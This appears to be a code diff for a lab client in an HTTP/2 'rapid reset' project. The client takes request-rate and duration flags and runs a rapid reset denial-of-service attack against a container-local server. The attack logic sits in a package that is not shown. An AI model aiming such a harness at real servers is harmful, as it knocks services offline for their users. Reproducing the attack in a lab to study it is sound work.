@@ -1,75 +1,38 @@
+// Client to be run in a container
 package main
 
 import (
-	"crypto/tls"
+	"flag"
 	"fmt"
+	"http2-rapid-reset/pkg/sender"
 	"http2-rapid-reset/pkg/spec"
-	"net/http"
 	"time"
+)
+
+var requestFreq *uint = flag.Uint(
+	"frequency",
+	100,
+	"Number of requests to perform per second",
+)
+
+var dur *time.Duration = flag.Duration(
+	"duration",
+	time.Duration(time.Second*5),
+	"Duration of rapid reset attack",
 )
 
 func main() {
 
+	flag.Parse()
 	spec.CtrlcHandler()
 
-	// transport := &http2.Transport{TLSClientConfig: tlsConfig}
-	// _ = transport
+	addr := fmt.Sprintf("https://server:%s", spec.ServerPort)
 
-	fmt.Println("Client")
-
-	// var client http.Client = *&http.Client{
-	// 	Transport: nil,
-	// 	CheckRedirect: func(req *http.Request, via []*http.Request) error {
-	// 	},
-	// 	Jar:     nil,
-	// 	Timeout: 0,
-	// }
-
-	transport := http.Transport{
-		TLSClientConfig: &tls.Config{
-			InsecureSkipVerify: true,
-		},
-	}
-
-	var client http.Client = http.Client{
-		Transport: &transport,
-	}
+	var client sender.Client = *sender.NewClient(addr)
 	_ = client
 
-	var url string = fmt.Sprintf("https://server:%s/", spec.ServerPort)
-
-	// resp, err := http.Post(
-	// 	url,
-	// 	"json",
-
-	// )
-	// if err != nil {
-	// 	fmt.Printf("error: %v\n", err)
-	// }
-
-	// fmt.Println(resp)
-
-	// Make a GET request.
-	req, err := http.NewRequest("GET", url, nil)
-	if err != nil {
-		fmt.Println("Error creating request:", err)
-		return
-	}
-
-	_ = req
-
-	// Send the request.
-	resp, err := client.Do(req)
-	if err != nil {
-		fmt.Println("Error sending request:", err)
-		return
-	}
-	defer resp.Body.Close()
-
-	fmt.Println("response contents: ", resp.Body)
-
-	for {
-		fmt.Println("Waiting")
-		time.Sleep(1 * time.Second)
-	}
+	client.RapidResetRequests(
+		*requestFreq,
+		*dur,
+	)
 }
